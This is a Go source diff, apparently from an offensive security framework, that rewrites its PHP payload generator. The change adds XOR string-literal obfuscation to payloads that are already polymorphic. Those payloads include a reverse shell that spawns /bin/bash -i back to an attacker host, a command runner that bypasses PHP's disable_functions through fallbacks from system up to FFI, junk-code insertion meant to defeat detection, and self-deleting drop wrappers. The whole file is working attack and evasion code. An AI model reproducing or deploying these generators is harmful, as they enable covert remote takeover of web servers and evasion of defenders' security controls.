@@ -9,45 +9,77 @@ func init() {
 	sdk.SetPHPEvalSystem(PHPEvalSystemExec)
 }
 
+// --- XOR string literal encoder ---
+// Uses PHP's native string XOR operator: 'text1' ^ 'text2'.
+// Both strings are printable ASCII, no \x escapes, no function calls,
+// no decoder functions. Each encoding produces unique random string pairs.
+
+func phpXorLiteral(s string) string {
+	if len(s) == 0 {
+		return "''"
+	}
+	data := []byte(s)
+	key := make([]byte, len(data))
+	result := make([]byte, len(data))
+	for i, b := range data {
+		for {
+			k := byte(sdk.RandInt(33, 126))
+			if k == 39 || k == 92 {
+				continue
+			}
+			r := b ^ k
+			if r >= 33 && r <= 126 && r != 39 && r != 92 {
+				key[i] = k
+				result[i] = r
+				break
+			}
+		}
+	}
+	return sdk.Sprintf(`('%s'^'%s')`, string(result), string(key))
+}
+
+// --- Payload generators ---
+
 // phpReverseShell returns raw PHP code for a reverse shell via proc_open.
 func phpReverseShell(lhost string, lport int) string {
+	enc := phpXorLiteral
 	vFs := phpVarName()
 	vPo := phpVarName()
 	return sdk.Sprintf(
 		`$%s=%s;$%s=%s;$s=$%s("%s",%d);$p=$%s(%s,[0=>$s,1=>$s,2=>$s],$pipes);`,
-		vFs, phpEncodeStr("fsockopen"), vPo, phpEncodeStr("proc_open"),
-		vFs, lhost, lport, vPo, phpEncodeStr("/bin/bash -i"),
+		vFs, enc("fsockopen"), vPo, enc("proc_open"),
+		vFs, lhost, lport, vPo, enc("/bin/bash -i"),
 	)
 }
 
 // phpExecCmd returns raw PHP code that executes a shell command using
 // multiple fallback functions, bypassing disable_functions restrictions.
-// Polymorphic: variable names, preamble order, function order, condition
-// structure, string encoding, and call style are all randomized per generation.
+// Fully polymorphic: XOR string literals, variable names, preamble order,
+// function order, condition structure, control flow mutation, dead code
+// insertion, and call style are all randomized per generation.
 func phpExecCmd(cmd string) string {
+	enc := phpXorLiteral
+
 	b64 := sdk.Base64Encode(cmd)
 	v := phpVars("d", "c", "f", "r", "p")
 	d, c, f, r, p := v["d"], v["c"], v["f"], v["r"], v["p"]
 
 	vEr, vStl, vIua := phpVarName(), phpVarName(), phpVarName()
 	preamble := sdk.Shuffle([]string{
-		sdk.Sprintf(`$%s=%s;@$%s(0)`, vEr, phpEncodeStr("error_reporting"), vEr),
-		sdk.Sprintf(`$%s=%s;@$%s(0)`, vStl, phpEncodeStr("set_time_limit"), vStl),
-		sdk.Sprintf(`$%s=%s;@$%s(1)`, vIua, phpEncodeStr("ignore_user_abort"), vIua),
+		sdk.Sprintf(`$%s=%s;@$%s(0)`, vEr, enc("error_reporting"), vEr),
+		sdk.Sprintf(`$%s=%s;@$%s(0)`, vStl, enc("set_time_limit"), vStl),
+		sdk.Sprintf(`$%s=%s;@$%s(1)`, vIua, enc("ignore_user_abort"), vIua),
 	})
 
-	// Encode each function name differently for the foreach array.
 	simple := sdk.Shuffle([]string{"system", "passthru", "shell_exec", "exec"})
 	encoded := make([]string, len(simple))
 	for i, fn := range simple {
-		encoded[i] = phpEncodeStr(fn)
+		encoded[i] = enc(fn)
 	}
 
-	guard := phpGuard(f, d)
-	call := phpCall(f, c)
+	guard := phpGuard(f, d, enc)
+	call := phpCall(f, c, enc)
 
-	// Each heavy fallback assigns an encoded function name to a temp var,
-	// then calls it indirectly - no plaintext function names in output.
 	vPo := phpVarName()
 	vPc := phpVarName()
 	vPr := phpVarName()
@@ -55,47 +87,47 @@ func phpExecCmd(cmd string) string {
 	vFfi := phpVarName()
 
 	heavy := sdk.Shuffle([]string{
-		phpIfWrap(phpCond(r, d, "popen"),
+		phpIfWrap(phpCond(r, d, "popen", enc),
 			sdk.Sprintf(`$%s=%s;$%s=%s;@$%s($%s($%s,%s));$%s=%s;`,
-				vPo, phpEncodeStr("popen"), vPc, phpEncodeStr("pclose"),
-				vPc, vPo, c, phpEncodeStr("r"), r, phpOne())),
-		phpIfWrap(phpCond(r, d, "proc_open"),
+				vPo, enc("popen"), vPc, enc("pclose"),
+				vPc, vPo, c, enc("r"), r, phpOne(enc))),
+		phpIfWrap(phpCond(r, d, "proc_open", enc),
 			sdk.Sprintf(`$%s=%s;@$%s($%s,[[%s,%s],[%s,%s],[%s,%s]],$%s);$%s=%s;`,
-				vPr, phpEncodeStr("proc_open"),
+				vPr, enc("proc_open"),
 				vPr, c,
-				phpEncodeStr("pipe"), phpEncodeStr("r"),
-				phpEncodeStr("pipe"), phpEncodeStr("w"),
-				phpEncodeStr("pipe"), phpEncodeStr("w"),
-				p, r, phpOne())),
-		phpIfWrap(phpCond(r, d, "pcntl_exec"),
+				enc("pipe"), enc("r"),
+				enc("pipe"), enc("w"),
+				enc("pipe"), enc("w"),
+				p, r, phpOne(enc))),
+		phpIfWrap(phpCond(r, d, "pcntl_exec", enc),
 			sdk.Sprintf(`$%s=%s;@$%s(%s,[%s,$%s]);$%s=%s;`,
-				vPe, phpEncodeStr("pcntl_exec"),
-				vPe, phpEncodeStr("/bin/sh"), phpEncodeStr("-c"), c, r, phpOne())),
+				vPe, enc("pcntl_exec"),
+				vPe, enc("/bin/sh"), enc("-c"), c, r, phpOne(enc))),
 		func() string {
 			vCd, vSy := phpVarName(), phpVarName()
 			return phpIfWrap(sdk.Sprintf(`!$%s`, r),
-				sdk.Sprintf(`$%s=%s;`+phpIfWrap(sdk.Sprintf(`$%s(%s)`, vFfi, phpEncodeStr("FFI")),
+				sdk.Sprintf(`$%s=%s;`+phpIfWrap(sdk.Sprintf(`$%s(%s)`, vFfi, enc("FFI")),
 					sdk.Sprintf(`$%s=%s;$%s=%s;$%s=%s;@$%s::{$%s}(%s)->{$%s}($%s);$%s=%s;`,
-						vFfi, phpEncodeStr("FFI"),
-						vCd, phpEncodeStr("cdef"),
-						vSy, phpEncodeStr("system"),
-						vFfi, vCd, phpEncodeStr("int system(const char *command);"),
-						vSy, c, r, phpOne())),
-					vFfi, phpEncodeStr("class_exists")))
+						vFfi, enc("FFI"),
+						vCd, enc("cdef"),
+						vSy, enc("system"),
+						vFfi, vCd, enc("int system(const char *command);"),
+						vSy, c, r, phpOne(enc))),
+					vFfi, enc("class_exists")))
 		}(),
 	})
 
 	vIni := phpVarName()
 	vB64 := phpVarName()
 
-	j1, j2, j3 := phpMaybeJunk(), phpMaybeJunk(), phpMaybeJunk()
+	j1, j2, j3 := phpMaybeJunk(enc), phpMaybeJunk(enc), phpMaybeJunk(enc)
 
 	osCheck := phpIfWrap(
-		sdk.Sprintf(`(%s)(PHP_OS,%s)`, phpEncodeStr("stristr"), phpEncodeStr("win")),
-		sdk.Sprintf(`$%s.=" 2>&1\n";`, c))
+		sdk.Sprintf(`(%s)(PHP_OS,%s)`, enc("stristr"), enc("win")),
+		sdk.Sprintf(`$%s.=%s."\n";`, c, enc(" 2>&1")))
 
 	foreachBody := phpIfWrapInner(guard,
-		sdk.Sprintf(`%s;$%s=%s;break;`, call, r, phpOne()))
+		sdk.Sprintf(`%s;$%s=%s;break;`, call, r, phpOne(enc)))
 
 	return sdk.Sprintf(`%s;%s;%s;%s`+
 		`$%s=%s;$%s=%s;$%s=@$%s(%s);$%s=$%s('%s');`+
@@ -104,10 +136,10 @@ func phpExecCmd(cmd string) string {
 		`foreach([%s,%s,%s,%s] as $%s){%s}`+
 		`%s%s%s%s%s`,
 		preamble[0], preamble[1], preamble[2], j1,
-		vIni, phpEncodeStr("ini_get"), vB64, phpEncodeStr("base64_decode"),
-		d, vIni, phpEncodeStr("disable_functions"), c, vB64, b64,
+		vIni, enc("ini_get"), vB64, enc("base64_decode"),
+		d, vIni, enc("disable_functions"), c, vB64, b64,
 		osCheck,
-		r, phpZero(), j2,
+		r, phpZero(enc), j2,
 		encoded[0], encoded[1], encoded[2], encoded[3], f, foreachBody,
 		j3, heavy[0], heavy[1], heavy[2], heavy[3],
 	)
@@ -115,26 +147,26 @@ func phpExecCmd(cmd string) string {
 
 // --- Condition generators (polymorphic) ---
 
-func phpCond(r, d, fn string) string {
-	parts := sdk.Shuffle([]string{phpNotRan(r), phpExistsEncoded(fn), phpNotDisabledEncoded(d, fn)})
+func phpCond(r, d, fn string, enc func(string) string) string {
+	parts := sdk.Shuffle([]string{phpNotRan(r), phpExistsEncoded(fn, enc), phpNotDisabledEncoded(d, fn, enc)})
 	return parts[0] + "&&" + parts[1] + "&&" + parts[2]
 }
 
-func phpGuard(f, d string) string {
-	exists := phpExistsVar(f)
-	notDisabled := phpNotDisabledVar(d, f)
+func phpGuard(f, d string, enc func(string) string) string {
+	exists := phpExistsVar(f, enc)
+	notDisabled := phpNotDisabledVar(d, f, enc)
 	if sdk.RandBool() {
 		return exists + "&&" + notDisabled
 	}
 	return notDisabled + "&&" + exists
 }
 
-func phpCall(f, c string) string {
+func phpCall(f, c string, enc func(string) string) string {
 	if sdk.RandBool() {
 		return sdk.Sprintf(`$%s($%s)`, f, c)
 	}
 	vCuf := phpVarName()
-	return sdk.Sprintf(`$%s=%s;$%s($%s,$%s)`, vCuf, phpEncodeStr("call_user_func"), vCuf, f, c)
+	return sdk.Sprintf(`$%s=%s;$%s($%s,$%s)`, vCuf, enc("call_user_func"), vCuf, f, c)
 }
 
 func phpNotRan(r string) string {
@@ -148,12 +180,12 @@ func phpNotRan(r string) string {
 	}
 }
 
-func phpExistsEncoded(fn string) string {
-	return sdk.Sprintf(`(%s)(%s)`, phpEncodeStr(phpCheckName()), phpEncodeStr(fn))
+func phpExistsEncoded(fn string, enc func(string) string) string {
+	return sdk.Sprintf(`(%s)(%s)`, enc(phpCheckName()), enc(fn))
 }
 
-func phpExistsVar(f string) string {
-	return sdk.Sprintf(`(%s)($%s)`, phpEncodeStr(phpCheckName()), f)
+func phpExistsVar(f string, enc func(string) string) string {
+	return sdk.Sprintf(`(%s)($%s)`, enc(phpCheckName()), f)
 }
 
 func phpCheckName() string {
@@ -163,21 +195,21 @@ func phpCheckName() string {
 	return "function_exists"
 }
 
-func phpNotDisabledEncoded(d, fn string) string {
-	enc := phpEncodeStr(fn)
-	stristr := phpEncodeStr("stristr")
+func phpNotDisabledEncoded(d, fn string, enc func(string) string) string {
+	e := enc(fn)
+	stristr := enc("stristr")
 	switch sdk.RandInt(0, 2) {
 	case 0:
-		return sdk.Sprintf(`!(%s)($%s,%s)`, stristr, d, enc)
+		return sdk.Sprintf(`!(%s)($%s,%s)`, stristr, d, e)
 	case 1:
-		return sdk.Sprintf(`(%s)($%s,%s)===false`, stristr, d, enc)
+		return sdk.Sprintf(`(%s)($%s,%s)===false`, stristr, d, e)
 	default:
-		return sdk.Sprintf(`false===(%s)($%s,%s)`, stristr, d, enc)
+		return sdk.Sprintf(`false===(%s)($%s,%s)`, stristr, d, e)
 	}
 }
 
-func phpNotDisabledVar(d, f string) string {
-	stristr := phpEncodeStr("stristr")
+func phpNotDisabledVar(d, f string, enc func(string) string) string {
+	stristr := enc("stristr")
 	switch sdk.RandInt(0, 2) {
 	case 0:
 		return sdk.Sprintf(`!(%s)($%s,$%s)`, stristr, d, f)
@@ -204,102 +236,66 @@ func phpIfWrap(cond, body string) string {
 	}
 }
 
-// phpIfPrefix returns the opening of an if-like statement for inline use.
-func phpIfPrefix() string {
-	switch sdk.RandInt(0, 1) {
-	case 0:
-		return "if(("
-	default:
-		return "if(!!("
-	}
-}
-
 // phpIfWrapInner wraps condition+body inside a foreach iteration.
 func phpIfWrapInner(cond, body string) string {
-	switch sdk.RandInt(0, 2) {
-	case 0:
-		return sdk.Sprintf(`if(%s){%s}`, cond, body)
-	case 1:
-		return sdk.Sprintf(`if(!(%s))continue;%s`, cond, body)
-	default:
+	if sdk.RandBool() {
 		return sdk.Sprintf(`if(%s){%s}`, cond, body)
 	}
+	return sdk.Sprintf(`if(!(%s))continue;%s`, cond, body)
 }
 
 // phpZero returns a random expression that evaluates to 0.
-func phpZero() string {
+func phpZero(enc func(string) string) string {
 	switch sdk.RandInt(0, 3) {
 	case 0:
 		return "0"
 	case 1:
 		return "0|0"
 	case 2:
-		return sdk.Sprintf(`%s('')`, phpEncodeStr("intval"))
+		return sdk.Sprintf(`(%s)('')`, enc("intval"))
 	default:
-		return sdk.Sprintf(`%s('')`, phpEncodeStr("strlen"))
+		return sdk.Sprintf(`(%s)('')`, enc("strlen"))
 	}
 }
 
 // phpOne returns a random expression that evaluates to 1.
-func phpOne() string {
+func phpOne(enc func(string) string) string {
 	switch sdk.RandInt(0, 2) {
 	case 0:
 		return "1"
 	case 1:
 		return "!!1"
 	default:
-		return sdk.Sprintf(`%s('1')`, phpEncodeStr("intval"))
+		return sdk.Sprintf(`(%s)('1')`, enc("intval"))
 	}
 }
 
 // phpJunk returns a random dead code statement.
-func phpJunk() string {
+func phpJunk(enc func(string) string) string {
 	v := phpVarName()
 	switch sdk.RandInt(0, 4) {
 	case 0:
-		return sdk.Sprintf(`$%s=%s(%s)`, v, phpEncodeStr("str_repeat"), phpEncodeStr(sdk.RandAlpha(1)))
+		return sdk.Sprintf(`$%s=(%s)(%s,%d)`, v, enc("str_repeat"), enc(sdk.RandAlpha(1)), sdk.RandInt(1, 10))
 	case 1:
-		return sdk.Sprintf(`$%s=%s()`, v, phpEncodeStr("time"))
+		return sdk.Sprintf(`$%s=(%s)()`, v, enc("time"))
 	case 2:
-		return sdk.Sprintf(`$%s=%s(0,%s)`, v, phpEncodeStr("str_pad"), phpEncodeStr(sdk.RandAlpha(1)))
+		return sdk.Sprintf(`$%s=(%s)(%s,%d)`, v, enc("str_pad"), enc(sdk.RandAlpha(1)), sdk.RandInt(1, 10))
 	case 3:
-		return sdk.Sprintf(`$%s=%s(%s)`, v, phpEncodeStr("md5"), phpEncodeStr(sdk.RandAlpha(4)))
+		return sdk.Sprintf(`$%s=(%s)(%s)`, v, enc("md5"), enc(sdk.RandAlpha(4)))
 	default:
-		return sdk.Sprintf(`$%s=%s()`, v, phpEncodeStr("microtime"))
+		return sdk.Sprintf(`$%s=(%s)()`, v, enc("microtime"))
 	}
 }
 
 // phpMaybeJunk returns junk code with a separator, or empty string.
-func phpMaybeJunk() string {
+func phpMaybeJunk(enc func(string) string) string {
 	if sdk.RandBool() {
-		return phpJunk() + ";"
+		return phpJunk(enc) + ";"
 	}
 	return ""
 }
 
-// --- String encoding (polymorphic) ---
-
-func phpEncodeStr(s string) string {
-	switch sdk.RandInt(0, 2) {
-	case 0:
-		return sdk.Sprintf(`base64_decode('%s')`, sdk.Base64Encode(s))
-	case 1:
-		return sdk.Sprintf(`str_rot13('%s')`, sdk.ROT13(s))
-	default:
-		return sdk.Sprintf(`hex2bin('%s')`, sdk.HexEncode(s))
-	}
-}
-
-func phpChrConcat(s string) string {
-	var out string
-	for i, b := range []byte(s) {
-		if i > 0 {
-			out += "."
-		}
-		out += sdk.Sprintf("chr(%d)", b)
-	}
-	return out
-}
+// --- Helpers ---
 
 func phpVarName() string { return sdk.RandAlpha(6) }
 
@@ -313,10 +309,20 @@ func phpVars(names ...string) map[string]string {
 
 // --- Drop wrappers (file-based) ---
 
-func phpDrop(code string) string { return sdk.Sprintf(`<?php unlink(__FILE__);%s ?>`, code) }
+func phpDrop(code string) string {
+	vU := phpVarName()
+	vK := phpVarName()
+	return sdk.Sprintf(
+		`<?php $%s=%s;$%s=%s;$%s($_SERVER[$%s]);%s ?>`,
+		vU, phpXorLiteral("unlink"),
+		vK, phpXorLiteral("SCRIPT_FILENAME"),
+		vU, vK, code)
+}
 
 // PHPReverseShellDrop returns a self-deleting PHP reverse shell for file drop.
-func PHPReverseShellDrop(lhost string, lport int) string { return phpDrop(phpReverseShell(lhost, lport)) }
+func PHPReverseShellDrop(lhost string, lport int) string {
+	return phpDrop(phpReverseShell(lhost, lport))
+}
 
 // PHPSystemDrop returns a self-deleting PHP system exec for file drop.
 func PHPSystemDrop(cmd string) string { return phpDrop(phpExecCmd(cmd)) }
